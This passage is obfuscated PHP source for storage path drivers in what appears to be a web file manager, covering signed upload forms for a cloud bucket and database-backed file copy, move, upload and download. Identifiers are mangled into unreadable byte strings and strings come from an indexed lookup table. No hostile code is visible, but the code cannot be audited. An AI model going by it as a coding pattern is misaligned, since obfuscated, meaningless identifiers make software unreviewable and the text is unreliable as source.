($ÊÊŸ“°Ô[$ö¤È€±[33]] == $ö¤È€±[78]) { $ÊÊŸ“°Ô[$ö¤È€±[87]] = $ØíØ£Ää->getPathInner($ÊÊŸ“°Ô[$ö¤È€±[87]]); $this->_copyChildTo($ØíØ£Ää, $ÊÊŸ“°Ô[$ö¤È€±[87]], $ø­µúÊò, $ºñˆó×Ê, $‘Õ²Æò’, $ë ¿Ë‹); } } } private function _addFiles($ ßí¤†ğ, $ò×Öš¹°, $ÏìÙ³İ±) { $…±áˆ¡É =& $_SERVER[÷åé¼î]; if (!$ò×Öš¹° || count($ò×Öš¹°) == 0) { return array(); } $·•ì¼™Î = array(); foreach ($ò×Öš¹° as &$ØÀœ‘«) { Hook::trigger($…±áˆ¡É[655], $ØÀœ‘«); $ØÀœ‘«[$…±áˆ¡É[87]] = $ ßí¤†ğ->getPathInner($ØÀœ‘«[$…±áˆ¡É[87]]); $Ä—ê”Øå = $ ßí¤†ğ->hashSimple($ØÀœ‘«[$…±áˆ¡É[87]]); $º”Ëë¼ = $ ßí¤†ğ->hashMd5($ØÀœ‘«[$…±áˆ¡É[87]]); if (strlen($º”Ëë¼) > 10 && !isset($·•ì¼™Î[$º”Ëë¼])) { $·•ì¼™Î[$º”Ëë¼] = array(); } $ØÀœ‘«[$…±áˆ¡É[656]] = $Ä—ê”Øå; $ØÀœ‘«[$…±áˆ¡É[531]] = $º”Ëë¼; $·•ì¼™Î[$º”Ëë¼][] =& $ØÀœ‘«; if (count($·•ì¼™Î[$º”Ëë¼]) > 1) { $ØÀœ‘«[$…±áˆ¡É[654]] = !0; } Hook::trigger($…±áˆ¡É[657], $ØÀœ‘«); } unset($ØÀœ‘«); $ã‘¸¿Èº = array($…±áˆ¡É[531] => array($…±áˆ¡É[7], array_keys($·•ì¼™Î))); $ÓşåµÑ = Model($…±áˆ¡É[658]); $‹²ˆûÎˆ = $ÓşåµÑ->where($ã‘¸¿Èº)->select(); $‹²ˆûÎˆ = $‹²ˆûÎˆ ? $‹²ˆûÎˆ : array(); foreach ($‹²ˆûÎˆ as $•¬Â”š´) { if (!isset($·•ì¼™Î[$•¬Â”š´[$…±áˆ¡É[531]]])) { continue; } $•¶íû‹ú = $·•ì¼™Î[$•¬Â”š´[$…±áˆ¡É[531]]]; foreach ($•¶íû‹ú as &$ØÀœ‘«) { $ØÀœ‘«[$…±áˆ¡É[525]] = $•¬Â”š´[$…±áˆ¡É[525]]; $ØÀœ‘«[$…±áˆ¡É[654]] = !0; } unset($ØÀœ‘«); } $ÈÕ÷ğîÌ = array(); foreach ($ò×Öš¹° as $…å€§‘œ) { Hook::trigger($…±áˆ¡É[659], $…å€§‘œ); if (isset($…å€§‘œ[$…±áˆ¡É[654]]) && $…å€§‘œ[$…±áˆ¡É[654]]) { Hook::trigger($…±áˆ¡É[660], $…å€§‘œ); continue; } $øøàâŸ = $ ßí¤†ğ->getPathInner($…å€§‘œ[$…±áˆ¡É[87]]); $ÅªÔëÑ = $ÓşåµÑ->addFileMake($øøàâŸ, $…å€§‘œ[$…±áˆ¡É[79]], $…å€§‘œ[$…±áˆ¡É[656]], $…å€§‘œ[$…±áˆ¡É[531]], $…å€§‘œ[$…±áˆ¡É[32]], $ÏìÙ³İ±); Hook::trigger($…±áˆ¡É[660], $…å€§‘œ); if (!is_array($ÅªÔëÑ)) { continue; } $ÈÕ÷ğîÌ[] = $ÅªÔëÑ; } $ÓşåµÑ->addAll($ÈÕ÷ğîÌ); $ã‘¸¿Èº = array($…±áˆ¡É[531] => array($…±áˆ¡É[7], array_keys($·•ì¼™Î))); $‹²ˆûÎˆ = $ÓşåµÑ->where($ã‘¸¿Èº)->select(); $‹²ˆûÎˆ = $‹²ˆûÎˆ ? $‹²ˆûÎˆ : array(); foreach ($‹²ˆûÎˆ as $•¬Â”š´) { if (!isset($·•ì¼™Î[$•¬Â”š´[$…±áˆ¡É[531]]])) { continue; } $…õ©Úƒü =& $·•ì¼™Î[$•¬Â”š´[$…±áˆ¡É[531]]]; foreach ($…õ©Úƒü as &$ØÀœ‘«) { $ØÀœ‘«[$…±áˆ¡É[525]] = $•¬Â”š´[$…±áˆ¡É[525]]; } unset($ØÀœ‘«); } $ûúì½™é = array(); foreach ($ò×Öš¹° as $¢úäşŸ“) { $ûúì½™é[$¢úäşŸ“[$…±áˆ¡É[32]]] = $¢úäşŸ“; } return $ûúì½™é; } } goto C¶Íâİç÷; côİ¯›Ã: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($«Áéùì·) { parent::__construct($«Áéùì·); $this->setSignVersion($_SERVER[÷åé¼î][247]); } public function uploadFormData($²éø•¡, $‚¨Äö³ò = 3600) { $„Í« ¬ =& $_SERVER[÷åé¼î]; $ÚÏÍ–Ç£ = $„Í« ¬[229]; $ë¦ã®ê™ = $„Í« ¬[263]; $æËÇµ¶ = $„Í« ¬[274]; $Öñæºü = gmdate($„Í« ¬[1406], time() + $‚¨Äö³ò); $ùÅº¼¢ = (string) time() . $„Í« ¬[74] . (string) (time() + $‚¨Äö³ò); $›¥Æ½ = array($„Í« ¬[275] => $Öñæºü, $„Í« ¬[278] => array(array($„Í« ¬[280] => $ÚÏÍ–Ç£), array($„Í« ¬[279] => $this->bucket), array($„Í« ¬[281], $„Í« ¬[282], $„Í« ¬[12]), array($„Í« ¬[285] => $æËÇµ¶), array($„Í« ¬[1407] => $ë¦ã®ê™), array($„Í« ¬[1408] => $this->accessKey), array($„Í« ¬[1409] => $ùÅº¼¢))); $›¥Æ½ = json_encode($›¥Æ½); $ªş¼Å›× = hash_hmac($„Í« ¬[263], $ùÅº¼¢, $this->secret); $“Œãü½É = sha1($›¥Æ½); $¼»ãáÍÈ = hash_hmac($„Í« ¬[263], $“Œãü½É, $ªş¼Å›×); $É©Ü¯Ñ” = array($„Í« ¬[280] => $ÚÏÍ–Ç£, $„Í« ¬[285] => $æËÇµ¶, $„Í« ¬[293] => base64_encode($›¥Æ½), $„Í« ¬[1407] => $ë¦ã®ê™, $„Í« ¬[1408] => $this->accessKey, $„Í« ¬[1410] => $ùÅº¼¢, $„Í« ¬[1411] => $¼»ãáÍÈ, $„Í« ¬[208] => $this->getHost()); return $É©Ü¯Ñ”; } public function fileOutImage($£•îì®Ï, $Å­‡šàÈ = 250) { $ïñõ¯®Á =& $_SERVER[÷åé¼î]; if ($this->size($£•îì®Ï) > 1024 * 1024 * 32) { return $this->fileOutImageServer($£•îì®Ï, $Å­‡šàÈ); } $ÆÇŞú«Ú = $this->link($£•îì®Ï); $ÆÇŞú«Ú .= $ïñõ¯®Á[1412] . $Å­‡šàÈ . $ïñõ¯®Á[1413]; $this->fileOutLink($ÆÇŞú«Ú); } public function fileOutLink($ñÊ£õˆÃ) { $·‹²Õª =& $_SERVER[÷åé¼î]; if (substr($ñÊ£õˆÃ, 0, 7) == $·‹²Õª[1404]) { $ñÊ£õˆÃ = $·‹²Õª[1405] . substr($ñÊ£õˆÃ, 7); } header($·‹²Õª[175] . $ñÊ£õˆÃ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($™ëÖÔ) { $this->pathParse = $™ëÖÔ; $this->model = Model($_SERVER[÷åé¼î][1414]); } public function getPath($¸²Óï†€) { return trim($¸²Óï†€, $_SERVER[÷åé¼î][8]); } public function pathFather($íí¹º½Ì) { $‡Ö¥€ÂÒ = $this->parse($íí¹º½Ì); $‡Ö¥€ÂÒ = $this->infoSimple($íí¹º½Ì); return $‡Ö¥€ÂÒ ? $‡Ö¥€ÂÒ[$_SERVER[÷åé¼î][192]] : !1; } public function pathThis($¶„¡‘Â) { $ÊåéîÓ“ = $this->infoSimple($¶„¡‘Â); return $ÊåéîÓ“ ? $ÊåéîÓ“[$_SERVER[÷åé¼î][32]] : !1; } public function getPathOuter($ÓÎÁ ºâ) { if (!$ÓÎÁ ºâ) { return $ÓÎÁ ºâ; } $áÅ¥Óê = $this->parse($ÓÎÁ ºâ); return KodIO::make($áÅ¥Óê[$_SERVER[÷åé¼î][459]]); } public function copyFolderFromIO($ÈööÓÆ, $ı±¨Š›, $¤÷îı‰™, $‚í½•Ú½, $¢­Ÿ€) { $æ¡íÈª™ = $this->model->copyFolderFromIO($ÈööÓÆ, $ı±¨Š›, $¤÷îı‰™, $‚í½•Ú½, $¢­Ÿ€); return KodIO::make($æ¡íÈª™); } public function isParentOf($–”êÏìÂ, $ùºå‹µ”) { return $this->model->isParentOf($–”êÏìÂ, $ùºå‹µ”); } public function mkfile($Èûö­¿¯, $ˆéü¢­‰ = '', $ˆø¤ı€‰ = REPEAT_RENAME) { $ú—üñùë =& $_SERVER[÷åé¼î]; $³øŒñÈ™ = $this->parse($Èûö­¿¯); $Èûö­¿¯ = $³øŒñÈ™[$ú—üñùë[459]]; for ($Ğî‡³‡ = 0; $Ğî‡³‡ < count($³øŒñÈ™[$ú—üñùë[1415]]); $Ğî‡³‡++) { $ÓÍ½‹™ş = $³øŒñÈ™[$ú—üñùë[1415]][$Ğî‡³‡]; if ($Ğî‡³‡ == count($³øŒñÈ™[$ú—üñùë[1415]]) - 1) { $Èûö­¿¯ = $this->model->mkfile($Èûö­¿¯, $ÓÍ½‹™ş, $ˆéü¢­‰, $ˆø¤ı€‰); break; } $Èûö­¿¯ = $this->model->mkdir($Èûö­¿¯, $ÓÍ½‹™ş, REPEAT_SKIP); } return $this->getPathOuter($Èûö­¿¯); } public function mkdir($«½·Ş²à, $ì×½»ú = REPEAT_SKIP) { $€ô¶Ù¿ =& $_SERVER[÷åé¼î]; $¥Âˆ‰–Ä = $this->parse($«½·Ş²à); $«½·Ş²à = $¥Âˆ‰–Ä[$€ô¶Ù¿[459]]; for ($¨Éİà÷ç = 0; $¨Éİà÷ç < count($¥Âˆ‰–Ä[$€ô¶Ù¿[1415]]); $¨Éİà÷ç++) { $ë³Ô‚® = $¥Âˆ‰–Ä[$€ô¶Ù¿[1415]][$¨Éİà÷ç]; $«½·Ş²à = $this->model->mkdir($«½·Ş²à, $ë³Ô‚®, $ì×½»ú); } return $this->getPathOuter($«½·Ş²à); } public function copyFile($†¦ˆ–Òû, $È³Æúó, $ˆ¼©†®¥ = REPEAT_REPLACE) { $êô†Ì‡ =& $_SERVER[÷åé¼î]; $¨½‰é…ë = $this->parse($È³Æúó); $¤©ï ¸º = $this->model->copy($†¦ˆ–Òû, $¨½‰é…ë[$êô†Ì‡[459]], $ˆ¼©†®¥, $¨½‰é…ë[$êô†Ì‡[87]]); return $¤©ï ¸º ? $this->getPathOuter($¤©ï ¸º) : !1; } public function moveFile($Û˜îØ¢È, $¢÷¹òÍÊ, $õµ­âå— = REPEAT_REPLACE) { $ó”½ç”ù =& $_SERVER[÷åé¼î]; $âÅÑëÖß = $this->parse($¢÷¹òÍÊ); $ûı”şª = $this->model->move($Û˜îØ¢È, $âÅÑëÖß[$ó”½ç”ù[459]], $õµ­âå—, $âÅÑëÖß[$ó”½ç”ù[87]]); return $ûı”şª ? $this->getPathOuter($ûı”şª) : !1; } public function copy($ªõÃ’ĞÌ, $£™‰à, $ßß²ÙÁ˜ = REPEAT_REPLACE, $´şÏı¡ = false) { $şÀ²—£‚ = $this->parse($£™‰à); $Ë’Õí°Ş = $this->model->copy($ªõÃ’ĞÌ, $şÀ²—£‚[$_SERVER[÷åé¼î][459]], $ßß²ÙÁ˜, $´şÏı¡); return $Ë’Õí°Ş ? $this->getPathOuter($Ë’Õí°Ş) : !1; } public function moveSameAllow() { } public function move($Û©ÚŠ°¿, $µßÔ´¯û, $ì“ş’Ù = REPEAT_REPLACE, $ğ›êˆ¸´ = false) { $”şÉÒÓø = $this->parse($µßÔ´¯û); $˜¡Œƒ¾¼ = $this->model->move($Û©ÚŠ°¿, $”şÉÒÓø[$_SERVER[÷åé¼î][459]], $ì“ş’Ù, $ğ›êˆ¸´); return $˜¡Œƒ¾¼ ? $this->getPathOuter($˜¡Œƒ¾¼) : !1; } public function remove($³ğªİ“, $“¸å¹‘  = true) { return $this->model->remove($³ğªİ“, $“¸å¹‘ ); } public function rename($ÛÔ€òÔ, $œ±¼Åû) { $Ü”ªôËÕ = $this->model->rename($ÛÔ€òÔ, $œ±¼Åû); return $Ü”ªôËÕ ? $this->getPathOuter($ÛÔ€òÔ) : $Ü”ªôËÕ; } public function size($õ¾›Á¨”) { $ˆù¡‡Ø = $this->infoSimple($õ¾›Á¨”); return $ˆù¡‡Ø ? $ˆù¡‡Ø[$_SERVER[÷åé¼î][79]] : 0; } public function infoSimple($„ı¦æ‘Ü) { return $this->model->sourceInfo($„ı¦æ‘Ü); } public function info($±–ö§±¾) { return $this->infoParse($±–ö§±¾); } public function infoAuth($»¹¡«Ö) { return $this->infoParse($»¹¡«Ö, !1, !0); } public function infoWithChildren($ùç Ù¦Æ) { return $this->infoParse($ùç Ù¦Æ, !0); } protected function infoParse($‹™ÉÇŒ, $³…ÂƒÂ = false, $¾Û–¸‡¥ = false) { if (!$³…ÂƒÂ) { return $this->model->pathInfo($‹™ÉÇŒ, $¾Û–¸‡¥); } return $this->model->pathInfoMore($‹™ÉÇŒ); } public function infoFullSimple($éáî¼—) { $²ÆŠå¹Ÿ =& $_SERVER[÷åé¼î]; $•Åí‘¾ = explode($²ÆŠå¹Ÿ[8], $éáî¼—); $­õæ¹¹ç = implode($²ÆŠå¹Ÿ[8], array_splice($•Åí‘¾, 1)); return $this->model->pathInfoByPath($•Åí‘¾[0], $­õæ¹¹ç); } public function infoFull($ÎåİüÉ) { $ñÍ¸ ß = $this->infoFullSimple($ÎåİüÉ); return is_array($ñÍ¸ ß) ? $this->model->pathInfo($ñÍ¸ ß[$_SERVER[÷åé¼î][193]]) : !1; } public function hashSimple($¶”ŞÓ˜Å) { $„¥ƒ–Œ± =& $_SERVER[÷åé¼î]; $åØ’şÚ¿ = $this->infoWithChildren($¶”ŞÓ˜Å); return $åØ’şÚ¿[$„¥ƒ–Œ±[170]][$„¥ƒ–Œ±[656]]; } public function hashMd5($á¿²şÒÄ) { $ñ«’»àØ =& $_SERVER[÷åé¼î]; $º´Œ¼š€ = $this->infoWithChildren($á¿²şÒÄ); return $º´Œ¼š€[$ñ«’»àØ[170]][$ñ«’»àØ[531]]; } public function exist($ªôÔï¢û) { $Û½²¯å =& $_SERVER[÷åé¼î]; $Ë§„è©¡ = $this->parse($ªôÔï¢û); if (!$Ë§„è©¡[$Û½²¯å[87]]) { return $this->isFile($ªôÔï¢û) || $this->isFolder($ªôÔï¢û); } $Ş„¢½€Ó = array($Û½²¯å[461] => $Ë§„è©¡[$Û½²¯å[459]], $Û½²¯å[32] => $Ë§„è©¡[$Û½²¯å[87]]); $–ì¬ÅÛ• = $this->model->where($Ş„¢½€Ó)->find(); return $–ì¬ÅÛ• ? !0 : !1; } public function isFile($ó¸ı±Ä) { $äÉßü¸ =& $_SERVER[÷åé¼î]; $ÔÇçöšô = $this->infoSimple($ó¸ı±Ä); return $ÔÇçöšô && $ÔÇçöšô[$äÉßü¸[469]] == $äÉßü¸[228] ? !0 : !1; } public function isFolder($Í¼±·ÈÆ) { $ö€Ÿ°×Ã =& $_SERVER[÷åé¼î]; $†ª¤ÛËÕ = $this->infoSimple($Í¼±·ÈÆ); return $†ª¤ÛËÕ && $†ª¤ÛËÕ[$ö€Ÿ°×Ã[469]] == $ö€Ÿ°×Ã[91] ? !0 : !1; } public function listPath($¬ÖòäşÆ, $Õ¨¢ª”¾ = false) { $°ìÏ ¯ğ =& $_SERVER[÷åé¼î]; if ($¬ÖòäşÆ == $°ìÏ ¯ğ[12]) { return !1; } $ÀœÜß = array($°ìÏ ¯ğ[461] => $¬ÖòäşÆ); if ($Õ¨¢ª”¾) { return $this->model->listSource($ÀœÜß, -1); } return $this->model->listSource($ÀœÜß); } public function has($Âî»¦ğ, $›¶ÎõÓ£ = false, $€ì“¶‚ï = null) { $²¬Éõ— =& $_SERVER[÷åé¼î]; $ƒ·‡ÈÄˆ = $this->infoWithChildren($Âî»¦ğ); if ($›¶ÎõÓ£) { return array($²¬Éõ—[240] => $ƒ·‡ÈÄˆ[$²¬Éõ—[240]], $²¬Éõ—[239] => $ƒ·‡ÈÄˆ[$²¬Éõ—[239]]); } return $€ì“¶‚ï ? $ƒ·‡ÈÄˆ[$²¬Éõ—[240]] : $ƒ·‡ÈÄˆ[$²¬Éõ—[239]]; } public function listAll($”Ê™Ù£) { $ã¦ íÄÀ = IO::info($this->pathParse[$_SERVER[÷åé¼î][87]]); if (!$ã¦ íÄÀ) { return array(); } return $this->model->listAll($”Ê™Ù£); } public function getContent($€éî¾§é) { return $this->model->getContent($€éî¾§é); } public function setContent($©İçÀŸ, $îİÃ ˆ© = '') { return $this->model->setContent($©İçÀŸ, $îİÃ ˆ©); } public function fileSubstr($½ŞÖü–‰, $øÔõ€î˜, $Ğ¦±¯×) { return $this->model->fileSubstr($½ŞÖü–‰, $øÔõ€î˜, $Ğ¦±¯×); } public function download($¸Í‹¿ÛÁ, $íóÂ¾¼¶ = '') { $Ä—…ù­Æ = get_path_father($íóÂ¾¼¶); $ÀıÛùù‘ = get_path_this($íóÂ¾¼¶); $óï¨ÑÉ = $this->model->fileInfoGet($¸Í‹¿ÛÁ); $µÂï÷ù = IO::copy($óï¨ÑÉ[$_SERVER[÷åé¼î][87]], $Ä—…ù­Æ, !1, $ÀıÛùù‘); return $µÂï÷ù; } public function setModifyTime($Ï¸šÕ¢â, $ùôä ‚÷ = '') { $èÇ©è– =& $_SERVER[÷åé¼î]; if (!$Ï¸šÕ¢â) { return; } $this->model->where(array($èÇ©è–[475] => $Ï¸šÕ¢â))->save(array($èÇ©è–[88] => $ùôä ‚÷)); } public function upload($½³â¯ı’, $«‚¦·Ë®, $˜çË¹‰ê = false, $Àªß›øû = REPEAT_REPLACE) { $ôÑ¤øø =& $_SERVER[÷åé¼î]; $¾ÕõÌØ˜ = $this->parse($½³â¯ı’); $¹Ë”ç¢§ = $this->model->addFile($¾ÕõÌØ˜[$ôÑ¤øø[459]], $«‚¦·Ë®, $¾ÕõÌØ˜[$ôÑ¤øø[87]], $˜çË¹‰ê, $Àªß›øû); return $this->getPathOuter($¹Ë”ç¢§); } public function uploadFileByID($÷ÂüÃÚ×, $âì±êñ­, $Õú÷€í) { $Æ³È»¿ï =& $_SERVER[÷åé¼î]; $Ğ¤Æ£‘ = $this->parse($÷ÂüÃÚ×); $–Œ‘ìß½ = $this->model->addFileByFileID($Ğ¤Æ£‘[$Æ³È»¿ï[459]], $âì±êñ­, $Ğ¤Æ£‘[$Æ³È»¿ï[87]], $Õú÷€í); return $this->getPathOuter($–Œ‘ìß½); } public function addFileByRemote($‚ÅçÈÛÛ, $Š£¿à›â, $´éèĞ« = array(), $¯–¤‡ôô = '', $İ¾ÀçĞ) { $ôúÜºµ¸ =& $_SERVER[÷åé¼î]; $¸¦ßï•¸ = $this->parse($‚ÅçÈÛÛ); $¯–¤‡ôô = empty($¯–¤‡ôô) ? $¸¦ßï•¸[$ôúÜºµ¸[87]] : $¯–¤‡ôô; $ïáˆ‹•É = $this->model->addFileByRemote($¸¦ßï•¸[$ôúÜºµ¸[459]], $Š£¿à›â, $¯–¤‡ôô, $´éèĞ«, $İ¾ÀçĞ); return $this->getPathOuter($ïáˆ‹•É); } public function uploadLink($ˆêáØªÜ, $¢¨‡·ê± = 0) { $·÷„Ö† =& $_SERVER[÷åé¼î]; $áÇâ‡š„ = $this->parse($ˆêáØªÜ); $°Ø¹ôÃß = _get($GLOBALS[$·÷„Ö†[7]], $·÷„Ö†[1416]); $ó‡‹“¾  = _get($GLOBALS[$·÷„Ö†[7]], $·÷„Ö†[1417]); $ˆêáØªÜ = Model($·÷„Ö†[658])->createFileName($áÇâ‡š„[$·÷„Ö†[87]], $°Ø¹ôÃß, $ó‡‹“¾ ); return IO::uploadLink($ˆêáØªÜ, $¢¨‡·ê±); } public function fileNameAuto($¾Ì²Š«ê, $õ¢Â¦ã, $š†©‡· = REPEAT_REPLACE, $¯ÑÖ±ËÈ = false) { return $this->model->fileNameAuto($¾Ì²Š«ê, $õ¢Â¦ã, $š†©‡·, $¯ÑÖ±ËÈ); } public function fileNameExist($¼ìà€™Ô, $à­•Úš) { return $this->model->fileNameExist($¼ìà€™Ô, $à­•Úš); } protected function _fileOut($Í¶ÅŠŠß, $£ñË¸É³ = false, $©¥‘’úÊ = false, $ÚÌ¦¡ ñ = '', $‰ÄŒÈ­ = false) { $è‰×ˆÅÎ =& $_SERVER[÷åé¼î]; $±ù¥ÎÏë = $this->model->sourceInfo($Í¶ÅŠŠß); if ($±ù¥ÎÏë[$è‰×ˆÅÎ[469]] == $è‰×ˆÅÎ[91]) { header($è‰×ˆÅÎ[1418]); die; } $à¬Ú™Ò¢ = $this->model->fileInfoGet($Í¶ÅŠŠß); $ÚÌ¦¡ ñ = $à¬Ú™Ò¢[$è‰×ˆÅÎ[531]] ? $à¬Ú™Ò¢[$è‰×ˆÅÎ[531]] : $ÚÌ¦¡ ñ; $ö²ğ½øÕ = isset($GLOBALS[$è‰×ˆÅÎ[182]]) && is_array($GLOBALS[$è‰×ˆÅÎ[182]]) ? $GLOBALS[$è‰×ˆÅÎ[182]][$è‰×ˆÅÎ[32]] : $±ù¥ÎÏë[$è‰×ˆÅÎ[32]]; if ($‰ÄŒÈ­) { return IO::fileOutServer($à¬Ú™Ò¢[$è‰×ˆÅÎ[87]], $£ñË¸É³, $ö²ğ½øÕ, $ÚÌ¦¡ ñ); } IO::fileOut($à¬Ú™Ò¢[$è‰×ˆÅÎ[87]], $£ñË¸É³, $ö²ğ½øÕ, $ÚÌ¦¡ ñ); } public function fileOut($Öˆ¯»©å, $Šèå‹É¬ = false, $À¥î¨à = false, $á¬ÕÁô† = '') { $this->_fileOut($Öˆ¯»©å, $Šèå‹É¬, $À¥î¨à, $á¬ÕÁô†); } public function fileOutServer($¼î±¨à÷, $¶Ğö’äà = false, $½å¹ßô» = false, $È‰ã†Šƒ = '') { $this->_fileOut($¼î±¨à÷, $¶Ğö’äà, $½å¹ßô», $È‰ã†Šƒ, !0); } protected function _fileOutImage($±”ˆÖ‰×, $ÉöõØ¤ = 250) { $Ó§´àÇı =& $_SERVER[÷åé¼î]; $„·™–À¼ = $this->model->pathInfo($±”ˆÖ‰×); if ($„·™–À¼[$Ó§´àÇı[469]] == $Ó§´àÇı[91]) { show_json($Ó§´àÇı[1419] . $±”ˆÖ‰×, !1); } $õû”İÎ = $this->model->fileInfoGet($±”ˆÖ‰×); $„·™–À¼[$Ó§´àÇı[183]] = $õû”İÎ[$Ó§´àÇı[87]]; $GLOBALS[$Ó§´àÇı[182]] = $„·™–À¼; IO::fileOutImage($õû”İÎ[$Ó§´àÇı[87]], $ÉöõØ¤); } public function fileOutImage($‚¨³‘Ùí, $”áƒ«‰ = 250) { $this->_fileOutImage($‚¨³‘Ùí, $”áƒ«‰); } public function fileOutImageServer($°È¢½Îè, $ŞÀ¶÷½› = 250) { $this->_fileOutImage($°È¢½Îè, $ŞÀ¶÷½›); } public function link($Ğ¢“¿Û³, $¹™ÜíÍÄ = '') { $¦¹™ÒÓë = $this->model->fileInfoGet($Ğ¢“¿Û³); return IO::link($¦¹™ÒÓë[$_SERVER[÷åé¼î][87]], $¹™ÜíÍÄ); } protected function parse($ÅÉ ¦’) { $ø‚ëÄ¼ç =& $_SERVER[÷åé¼î]; if (strstr($ÅÉ ¦’, $ø‚ëÄ¼ç[8]) === !1) { return array($ø‚ëÄ¼ç[477] => intval($ÅÉ ¦’), $ø‚ëÄ¼ç[87] => $ø‚ëÄ¼ç[12], $ø‚ëÄ¼ç[1415] => array()); } $Âã¥Õã = explode($ø‚ëÄ¼ç[8], trim($ÅÉ ¦’, $ø‚ëÄ¼ç[8])); if (count($Âã¥Õã) < 2) { show_tips(clear_html($ÅÉ ¦’) . $ø‚ëÄ¼ç[1420]); } return array($ø‚ëÄ¼ç[477] => intval($Âã¥Õã[0]), $ø‚ëÄ¼ç[87] => $Âã¥Õã[1], $ø‚ëÄ¼ç[1415] => array_slice($Âã¥Õã, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ó¼Í˜‹‚) { $this->pathParse = $ó¼Í˜‹‚; $this->model = Model($_SERVER[÷åé¼î][1414]); } public function getPathOuter($Ğ´·“Ş‡) { $ÔÛº™ˆŠ =& $_SERVER[÷åé¼î]; if (!$Ğ´·“Ş‡) { return $Ğ´·“Ş‡; } $„Ú¢ıøù = $this->parse($Ğ´·“Ş‡); return trim(KodIO::makeShare($this->pathParse[$ÔÛº™ˆŠ[459]], $„Ú¢ıøù[$ÔÛº™ˆŠ[459]]), $ÔÛº™ˆŠ[8]); } protected function infoParse($ÑÉÄÎÙ¥, $¦© ×«Ô = false, $Ò˜ûå­™ = false) { $ùõĞ¨Í =& $_SERVER[÷åé¼î]; $Óö®šõ™ = $this->pathParse[$ùõĞ¨Í[459]]; $³üè§©À = trim($this->pathParse[$ùõĞ¨Í[1244]], $ùõĞ¨Í[8]); return Action($ùõĞ¨Í[1421])->sharePathInfo($Óö®šõ™, $³üè§©À, $¦© ×«Ô); } public function infoFull($ã–Ğ¸) { $’¾‹¨ =& $_SERVER[÷åé¼î]; $ÃÇ°Œş— = explode($’¾‹¨[8], trim($ã–Ğ¸, $’¾‹¨[8])); if (count($ÃÇ°Œş—) > 1) { $æ÷—·İ‹ = implode($’¾‹¨[8], array_splice($ÃÇ°Œş—, 1)); $¸Şûäòñ = $this->model->pathInfoByPath($ÃÇ°Œş—[0], $æ÷—·İ‹); if (!$¸Şûäòñ) { return !1; } $this->pathParse[$’¾‹¨[1244]] = $¸Şûäòñ[$’¾‹¨[193]]; } return $this->infoParse($ã–Ğ¸); } public function listAll($¡¯›Èå) { $…ğ†•æÆ =& $_SERVER[÷åé¼î]; $˜¿àûÌ§ = IO::info($this->pathParse[$…ğ†•æÆ[87]]); if (!$˜¿àûÌ§) { return array(); } $ÜĞçìğ“ = $this->model->listAll($¡¯›Èå); $ùÒÍêÊ = Model($…ğ†•æÆ[648])->getInfo($˜¿àûÌ§[$…ğ†•æÆ[649]]); foreach ($ÜĞçìğ“ as &$„îÉªĞ½) { check_abort(); $„îÉªĞ½[$…ğ†•æÆ[90]] = Action($…ğ†•æÆ[1421])->_shareItemeParse($„îÉªĞ½[$…ğ†•æÆ[90]], $ùÒÍêÊ); } unset($„îÉªĞ½); return $ÜĞçìğ“; } } goto BÓéä„‹°¯; fŠ¾¶ëÆÄÈ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¶æ¿ğôô =& $_SERVER[÷åé¼î]; $this->objectDriver = array($¶æ¿ğôô[60], $¶æ¿ğôô[61], $¶æ¿ğôô[62], $¶æ¿ğôô[63], $¶æ¿ğôô[64], $¶æ¿ğôô[65], $¶æ¿ğôô[66], $¶æ¿ğôô[67], $¶æ¿ğôô[68], $¶æ¿ğôô[69], $¶æ¿ğôô[70], $¶æ¿ğôô[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($İ®¼½À×) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($İ®¼½À×, $_SERVER[÷åé¼î][8]); } return $İ®¼½À×; } public function iconvApp($ä¨ÎÊÓò) { return $ä¨ÎÊÓò; } public function iconvSystem($Â‰Ì¥î») { return $Â‰Ì¥î»; } public function iconvTo($©îŞ°³¢, $‹æğ²éõ, $ÃÎÅ÷¿) { $¦Òæ×’† =& $_SERVER[÷åé¼î]; if (!$©îŞ°³¢ || !function_exists($¦Òæ×’†[72])) { return $©îŞ°³¢; } static $Êñ™·£‚ = array(); $Ï°…ã¡õ = $‹æğ²éõ . $¦Òæ×’†[73] . $ÃÎÅ÷¿ . $¦Òæ×’†[74] . $©îŞ°³¢; if (isset($Êñ™·£‚[$Ï°…ã¡õ])) { return $Êñ™·£‚[$Ï°…ã¡õ]; } if (function_exists($¦Òæ×’†[75])) { $¸ÅÇš½ = @mb_convert_encoding($©îŞ°³¢, $ÃÎÅ÷¿, $‹æğ²éõ); } else { $¸ÅÇš½ = @iconv($‹æğ²éõ, $ÃÎÅ÷¿, $©îŞ°³¢); } $¸ÅÇš½ = $¸ÅÇš½ ? $¸ÅÇš½ : $©îŞ°³¢; if (strstr($¸ÅÇš½, $¦Òæ×’†[76])) { $¸ÅÇš½ = str_replace($¦Òæ×’†[76], $¦Òæ×’†[11], $¸ÅÇš½); } $Êñ™·£‚[$‹æğ²éõ . $¦Òæ×’†[73] . $ÃÎÅ÷¿ . $¦Òæ×’†[74] . $©îŞ°³¢] = $¸ÅÇš½; $Êñ™·£‚[$ÃÎÅ÷¿ . $¦Òæ×’†[73] . $‹æğ²éõ . $¦Òæ×’†[74] . $©îŞ°³¢] = $©îŞ°³¢; $Êñ™·£‚[$ÃÎÅ÷¿ . $¦Òæ×’†[73] . $‹æğ²éõ . $¦Òæ×’†[74] . $¸ÅÇš½] = $©îŞ°³¢; $Êñ™·£‚[$‹æğ²éõ . $¦Òæ×’†[73] . $ÃÎÅ÷¿ . $¦Òæ×’†[74] . $¸ÅÇš½] = $¸ÅÇš½; return $¸ÅÇš½; } public function getPathInner($«÷›½å) { $»¯áùêİ = IO::init($«÷›½å); return $»¯áùêİ->path; } public function getPathOuter($ûÜ‡³¦Š) { $ÎØÖ…é† =& $_SERVER[÷åé¼î]; $óÈ³½˜® = strlen(trim($this->pathBase, $ÎØÖ…é†[8])); $ûÜ‡³¦Š = substr(trim($ûÜ‡³¦Š, $ÎØÖ…é†[8]), $óÈ³½˜®); return $this->pathDriver . $ÎØÖ…é†[8] . ltrim($ûÜ‡³¦Š, $ÎØÖ…é†[8]); } public function isParentOf($ËÛ®·‹Û, $Õôß§¤) { $¶­ş¡ö =& 